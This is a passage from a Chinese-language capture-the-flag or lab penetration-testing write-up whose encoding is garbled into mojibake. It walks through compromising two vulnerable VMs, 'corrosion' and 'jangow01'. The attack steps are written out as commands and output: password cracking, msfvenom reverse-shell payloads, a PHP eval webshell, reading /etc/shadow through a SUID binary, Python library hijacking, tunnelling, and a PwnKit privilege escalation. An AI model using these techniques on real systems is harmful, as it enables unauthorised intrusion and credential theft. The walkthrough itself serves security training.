backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 4ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 1ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
:: Progress: [225172/225172] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```



ç«¯å£æ‰«ææ—¶å‘ç° 8080 æ˜¯ tomcat æœåŠ¡å™¨ï¼Œmanager æ˜¯ tomcat æœåŠ¡å™¨çš„ web ç®¡ç†é¡µé¢ã€‚

è®¿é—®é¡µé¢éœ€è¦æä¾›è´¦å·å¯†ç ã€‚

![image-20250302162514632](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302162514632.png)



ä¸‹è½½å‹ç¼©åŒ…ï¼Œçœ‹çœ‹å…¶ä¸­æ˜¯å¦å­˜åœ¨å¯ç”¨ä¿¡æ¯ã€‚

```
root@xiaoshae:/opt# wget http://10.10.10.103:8080/backup.zip
--2025-03-02 18:30:07--  http://10.10.10.103:8080/backup.zip
Connecting to 10.10.10.103:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 33723 (33K) [application/zip]
Saving to: â€˜backup.zipâ€™

backup.zip                               100%[===============================================================================>]  32.93K  --.-KB/s    in 0s      

2025-03-02 18:30:07 (892 MB/s) - â€˜backup.zipâ€™ saved [33723/33723]
```



å°è¯•è§£å‹ï¼Œå‘ç°éœ€è¦è´¦å·å¯†ç 

```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] catalina.policy password: root
```



ä½¿ç”¨ zip2john æå– hash 

```
zip2john backup.zip > hash 

ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: TS_chk, cmplen=626, decmplen=1149, crc=748A87A6 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: TS_chk, cmplen=862, decmplen=2313, crc=3B44D150 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9 ts=B0E3 cs=b0e3 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070 ts=6920 cs=6920 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```



å°è¯•çˆ†ç ´å¯†ç 

```
john --wordlist=rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:01 DONE (2025-03-02 18:32) 0.9901g/s 11387Kp/s 11387Kc/s 11387KC/s @lexus1s..9Spruce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

å¯†ç ä¸ºï¼š@administrator_hi5



è§£å‹å‹ç¼©åŒ…

```
unzip backup.zip

Archive:  backup.zip
[backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml
```



æŸ¥æ‰¾æ–‡ä»¶ä¿¡æ¯ï¼Œåœ¨ tomcat-users.xml æ–‡ä»¶ä¸­å‘ç° tomcat manager çš„å¯†ç ä¸º **melehifokivai**ã€‚

![image-20250302183425398](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183425398.png)



æˆåŠŸç™»å½• manager é¡µé¢ï¼Œå‘ç°å¯ä»¥éƒ¨ç½² war åº”ç”¨ç¨‹åº

![image-20250302183621629](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183621629.png)



ä½¿ç”¨ msfvenom ç”Ÿæˆé€‚ç”¨äº war çš„åå‘ shell

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f war -o shell.war

Payload size: 6210 bytes
Final size of war file: 6210 bytes
Saved as: shell.war
```



ä½¿ç”¨ msfconsole ç›‘å¬

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp 
PAYLOAD => java/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.10.10
LHOST => 10.10.10.10

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
```



åœ¨ manager ä¸­éƒ¨ç½² shell.war åº”ç”¨ç¨‹åº

![image-20250302184036642](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184036642.png)



éƒ¨ç½²æˆåŠŸåè®¿é—®é¡µé¢ï¼ˆé¡µé¢ä¸ºç©ºæ˜¯æ­£å¸¸æƒ…å†µï¼‰

![image-20250302184059909](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184059909.png)

![image-20250302184118563](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184118563.png)



åå‘ shell è¿æ¥æˆåŠŸ

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
[*] Sending stage (58073 bytes) to 10.10.10.103
[*] Meterpreter session 1 opened (10.10.10.10:8080 -> 10.10.10.103:58936) at 2025-03-02 10:41:02 +0000

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
```



æå‡ä¼šè¯

```
msf6 exploit(multi/handler) > sessions -u 1 
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_sys_process_kill
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.10.10:4433 
[*] Command stager progress: 100.00% (773/773 bytes)

[*] Sending stage (1017704 bytes) to 10.10.10.103
msf6 exploit(multi/handler) > [*] Meterpreter session 2 opened (10.10.10.10:4433 -> 10.10.10.103:34140) at 2025-03-02 10:42:20 +0000
[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > 
```



é€šè¿‡ Meterpreter æ”¶é›†ä¿¡æ¯

```
msf6 exploit(multi/handler) > sessions -i 2 
[*] Starting interaction with 2...

meterpreter > sysinfo 
Computer     : 10.10.10.103
OS           : Ubuntu 20.04 (Linux 5.11.0-34-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```



åœ¨ /home è·¯å¾„ä¸‹å­˜åœ¨ä¸¤ä¸ªç”¨æˆ·

```
tomcat@corrosion:/home$ ls
jaye
randy
```



å°è¯•æ’åº“æ”»å‡»ï¼Œä½¿ç”¨ manager çš„å¯†ç ï¼ˆ**melehifokivai**ï¼‰ï¼Œå» ssh ç™»å½•è¿™ä¸¤ä¸ªç”¨æˆ·ï¼Œå‘ç° jaye ç”¨æˆ·å¯†ç å’Œ manager å¯†ç ä¸€è‡´ã€‚

ç™»å½• jaye è´¦æˆ·åå‘ç°å…¶å­˜åœ¨ä¸€ä¸ª **SUID å’Œ SGID** çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚

- å½“ç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ï¼Œè¿›ç¨‹çš„ **æœ‰æ•ˆç”¨æˆ· ID** ä¼šä¸´æ—¶å˜ä¸ºæ–‡ä»¶æ‰€æœ‰è€…ï¼ˆ`root`ï¼‰ã€‚
- è¿›ç¨‹çš„ **æœ‰æ•ˆç»„ ID** ä¼šä¸´æ—¶å˜ä¸ºæ–‡ä»¶æ‰€å±ç»„ï¼ˆ`root`ï¼‰ã€‚

```
jaye@corrosion:~/Files$ file look
look: setuid, setgid executable, regular file, no read permission
```



`look` æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œé€šå¸¸ç”¨äºåœ¨ **å·²æ’åºçš„æ–‡ä»¶** ä¸­æŸ¥æ‰¾ä»¥ç‰¹å®šå­—ç¬¦ä¸²å¼€å¤´çš„è¡Œã€‚å®ƒçš„è¡Œä¸ºç±»ä¼¼äºç®€åŒ–çš„ `grep`ï¼Œä½†ä¸“ä¸ºå¿«é€ŸæŸ¥æ‰¾å‰ç¼€è®¾è®¡ã€‚

- `[-bdf]`ï¼šå¯é€‰å‚æ•°ï¼ˆé€‰é¡¹ï¼‰ï¼š
    - `-b`ï¼šåœ¨æŸ¥æ‰¾æ—¶å¿½ç•¥å­—ç¬¦ä¸²å‰çš„ç©ºç™½ï¼ˆå¦‚ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ï¼‰ã€‚
    - `-d`ï¼šä»…æ¯”è¾ƒå­—æ¯ã€æ•°å­—å’Œç©ºæ ¼ï¼ˆå¿½ç•¥å…¶ä»–å­—ç¬¦ï¼Œå¦‚æ ‡ç‚¹ç¬¦å·ï¼‰ã€‚
    - `-f`ï¼šå¿½ç•¥å¤§å°å†™ï¼ˆå¦‚å°† "A" å’Œ "a" è§†ä¸ºç›¸åŒï¼‰ã€‚
- `[-t char]`ï¼šæŒ‡å®šç»ˆæ­¢ç¬¦ï¼ˆ`char` æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼‰ï¼Œä»…åŒ¹é…åˆ°è¯¥å­—ç¬¦å‰çš„å­—ç¬¦ä¸²ã€‚
- `string`ï¼šè¦æŸ¥æ‰¾çš„ **å‰ç¼€å­—ç¬¦ä¸²**ï¼ˆå¿…éœ€å‚æ•°ï¼‰ã€‚
- `[file ...]`ï¼šè¦æœç´¢çš„æ–‡ä»¶åˆ—è¡¨ï¼ˆå¯é€‰å‚æ•°ï¼Œé»˜è®¤å¯èƒ½ä½¿ç”¨ç³»ç»Ÿå­—å…¸æ–‡ä»¶ï¼‰ã€‚



å½“æ™®é€šç”¨æˆ· jaye æ‰§è¡Œ look å‘½ä»¤æ˜¯ï¼Œlook å‘½ä»¤ä¼šä»¥ root æƒé™è¿è¡Œï¼Œä½¿ç”¨ look è¯»å– /etc/shadow æ–‡ä»¶

```
jaye@corrosion:~/Files$ ./look '' /etc/shadow 
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
...
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
...
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```



ä½¿ç”¨ john æˆåŠŸçˆ†ç ´ randy å¯†ç 

```
john â€” wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
07051986randy
```



åˆ‡æ¢åˆ° randy ç”¨æˆ·

```
jaye@corrosion:/home/randy$ su randy 
Password: 
randy@corrosion:~$ 
```



æŸ¥çœ‹ randy çš„ sudo æƒé™ï¼Œè¾“å‡ºæ˜¾ç¤º Randy å¯ä»¥ä½¿ç”¨æå‡çš„æƒé™è¿è¡Œ Python è„šæœ¬ã€‚

```
randy@corrosion:~$ sudo -l 
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



randombase64.py ä»… root ç”¨æˆ·å¯ä»¥ä¿®æ”¹ï¼ŒæŸ¥çœ‹è¿™ä¸ª python è„šæœ¬å‘ç°å…¶å¯¼å…¥ä¸€ä¸ª base64 åº“æ–‡ä»¶ã€‚

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
randy@corrosion:~$ file randombase64.py 
randombase64.py: ASCII text
```



åŸºç¡€çš„ Python åº“åŠ«æŒæœ‰ **PYTHONPATHç¯å¢ƒå˜é‡ã€ç›´æ¥ä¿®æ”¹åº“æ–‡ä»¶ï¼ˆå…·æœ‰å†™æƒé™ï¼‰**ã€‚

å› ä¸º sudo å‘½ä»¤çš„å®‰å…¨è®¾ç½®ï¼Œ**ä¼šé‡ç½®ç¯å¢ƒå˜é‡**ï¼Œä¸”æ— æ³•è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¸å­˜åœ¨**PYTHONPATHç¯å¢ƒå˜é‡**ã€‚

```
randy@corrosion:/tmp/test$ sudo PYTHONPATH=/tmp/test/ /usr/bin/python3.8 /home/randy/randombase64.py 

sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```



æŸ¥çœ‹ Python æœç´¢åº“çš„è·¯å¾„

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



åœ¨ç³»ç»Ÿä¸ŠæŸ¥æ‰¾æ‰€æœ‰ base64.py æ–‡ä»¶

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



æŸ¥çœ‹æ–‡ä»¶çš„æƒé™ï¼ˆå…·æœ‰å†™å…¥æƒé™ï¼‰

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



ä¿®æ”¹ base64.py æ–‡ä»¶

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo æ‰§è¡Œè„šæœ¬ï¼Œè·å¾— root æƒé™ã€‚

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### jangow01



Nmap æ‰«æ IP åœ°å€

```
nmap -sP -PR -n -T 5 10.10.10.0/24

...
MAC Address: 00:50:56:C0:00:0A (VMware)
Nmap scan report for 10.10.10.100
```



Nmap æ‰«æ TCP ç«¯å£ï¼Œå‘ç°ä¸€ä¸ª HTTP ç«™ç‚¹å’Œ VSFTPD ç«™ç‚¹ã€‚

```
db_nmap -sV -n -p- -r -T 5 -O 10.10.10.100

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.100  21    tcp    ftp   open   vsftpd 3.0.3
10.10.10.100  80    tcp    http  open   Apache httpd 2.4.18
```



ä½¿ç”¨ ffuf é«˜é¢‘æ–‡ä»¶å­—å…¸çˆ†ç ´ç½‘ç«™è·¯å¾„ï¼Œå‘ç° .backup æ–‡ä»¶ã€‚

```
ffuf -u http://10.10.10.100/FUZZ -w raft-large-files-lowercase.txt

...
.backup                 [Status: 200, Size: 336, Words: 30, Lines: 13, Duration: 10ms]
...
:: Progress: [35325/35325] :: Job [1/1] :: 74 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```



ä½¿ç”¨ wget ä¸‹è½½ .backup æ–‡ä»¶ï¼Œå‘ç°é‡Œé¢ä¸ºè¿æ¥æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ã€‚

```
wget http://10.10.10.100/.backup -O backup

# æ–‡ä»¶å†…å®¹
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```



å°è¯•ä½¿ç”¨æ”¹è´¦å·å¯†ç ç™»å½• ftp æœåŠ¡å™¨ï¼Œç™»å½•æˆåŠŸï¼Œå¯èƒ½æ˜¯ç³»ç»Ÿç”¨æˆ·ã€‚

![image-20250304140204604](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140204604.png)



ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘ç«™ï¼Œå‘ç°ä¸€ä¸ªå‚æ•°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä»¥ä¸‹æ˜¯å‘ç°è¿‡ç¨‹ï¼š

![image-20250304140413616](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140413616.png)

![image-20250304140500353](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140500353.png)

![image-20250304140522856](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140522856.png)

![image-20250304140534450](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140534450.png)



å¯¹ä¸€å¥è¯æœ¨é©¬è¿›è¡Œ base64 ç¼–ç 

```
<?php eval($_POST['CMD']); ?>
```

```
PD9waHAgZXZhbCgkX1BPU1RbJ0NNRCddKTsgPz4=
```



ä½¿ç”¨ yakit ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬

![image-20250304140840730](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140840730.png)



ä½¿ç”¨ä¸­å›½èšå‰‘è¿æ¥æˆåŠŸ

![image-20250304141035051](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304141035051.png)



ç®€å•æµ‹è¯•å‘ç°é¶æœºå¯¹å…¥ç«™å’Œå‡ºç«™æµé‡åšäº†é™åˆ¶

![image-20250304141208731](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304141208731.png)



ä½¿ç”¨ netstat -tunpl å‘ç°é¶æœºä¸­å¼€å¯äº† ssh æœåŠ¡ï¼Œç›‘å¬äº† 22 ç«¯å£ï¼Œä½†æ˜¯é…ç½®äº†é˜²ç«å¢™ç¦æ­¢ 22 ç«¯å£å…¥ç«™ã€‚

![image-20250304163418690](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304163418690.png)



ä½¿ç”¨ Neo-reGeorg ç”Ÿæˆ php æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°ç½‘ç«™ä¸­ã€‚

```
neoreg generate -k 123

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.cs
       => neoreg_servers/tunnel.go
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
```

![image-20250304162410860](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304162410860.png)



ä½¿ç”¨ Neo-reGeorg å°†æœ¬åœ° 2222 ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœº 22 ç«¯å£ã€‚

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php --read-interval 1 --write-interval 1 -l 0.0.0.0 -p 2222 -t 127.0.0.1:22

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting Forward [0.0.0.0:2222] => [127.0.0.1:22]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



ä½¿ç”¨æ³„éœ²çš„è´¦å·å¯†ç ï¼Œé€šè¿‡ 127.0.0.1:2222 è¿›è¡Œ ssh ç™»å½•ã€‚

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



å¦‚æœæƒ³è¦ msfconsole æ¥ç®¡ç³»ç»Ÿï¼Œå¿…é¡»åœ¨è¿œç¨‹ç«¯å£è½¬å‘ï¼Œå°†é¶æœºçš„æµé‡è½¬å‘åˆ°æ”»å‡»æœºã€‚

Neo-reGeorg å¯ä»¥å¾ˆå¥½çš„è¿›è¡Œæœ¬åœ°ç«¯å£è½¬å‘ï¼Œä½†ä¸å¤ªé€‚åˆè¿›è¡Œè¿œç¨‹ç«¯å£è½¬å‘ï¼Œä¸è¿‡å½“å‰å·²ç»å¯ä»¥è¿æ¥åˆ°é¶æœºçš„ ssh æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ ssh è‡ªå¸¦çš„è¿œç¨‹ç«¯å£è½¬å‘ã€‚

```
ssh jangow01@127.0.0.1 -p 2222 -R 4444:127.0.0.1:4444 -R 5555:127.0.0.1:5555 -Nf
```



åœ¨é¶æœºä¸Šæ‰§è¡Œ netstat -tunpl å‘½ä»¤ï¼Œå‘ç°å·²ç»ç›‘å¬ 4444 å’Œ 5555 ç«¯å£ã€‚

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN       -               
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



åœ¨æœ¬æœº nc -l -p 4444 ç›‘å¬ç«¯å£ï¼Œé¶æœºè¿æ¥ nc 127.0.0.1 4444 ç«¯å£ï¼Œæ•°æ®è½¬å‘æˆåŠŸã€‚

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
hello

root@localhost:~# nc -l -p 4444
hello
```



msfconsole ç”Ÿæˆ payload æ–‡ä»¶ï¼ˆLHOST 127.0.0.1 LPORT 4444ï¼‰ï¼Œä¸Šä¼ åˆ°é¶æœºã€‚

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o elf 

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: elf
```

![image-20250304181254293](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304181254293.png)



msfconsole ç›‘å¬ç«¯å£

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
```



åœ¨é¶æœºä¸Šè®¾ç½® elf å¯æ‰§è¡Œæƒé™ï¼Œå¹¶æ‰§è¡Œã€‚

![image-20250304181740428](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304181740428.png)



msfconsole æˆåŠŸä¸Šçº¿

```
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (3045380 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:40612) at 2025-03-04 10:16:55 +0000

meterpreter > sysinfo 
Computer     : 10.10.10.100
OS           : Ubuntu 16.04 (Linux 4.4.0-31-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```



ä½¿ç”¨ post/multi/recon/local_exploit_suggester æ‰«ææœ¬åœ°ææƒæ¼æ´

```
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 127.0.0.1 - Collecting local exploits for x64/linux...
[*] 127.0.0.1 - 203 exploit checks are being tried...
[+] 127.0.0.1 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
[+] 127.0.0.1 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/ntfs3g_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 127.0.0.1 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
[*] Running check method for exploit 73 / 73
[*] 127.0.0.1 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 4   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
 6   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/ntfs3g_priv_esc                                 Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 9   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 10  exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 11  exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
...
```



é€ä¸ªå°è¯•æ‰«æåˆ°çš„æ¼æ´ï¼ŒæˆåŠŸæå‡æƒé™åˆ° root

```
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1 
SESSION => 1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 5555
LPORT => 5555

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.qhwyrca
[+] The target is vulnerable.
[*] Writing '/tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.wefuymefljbi
[*] Sending stage (3045380 bytes) to 127.0.0.1
[+] Deleted /tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so
[+] Deleted /tmp/.wefuymefljbi/.oniqfxz
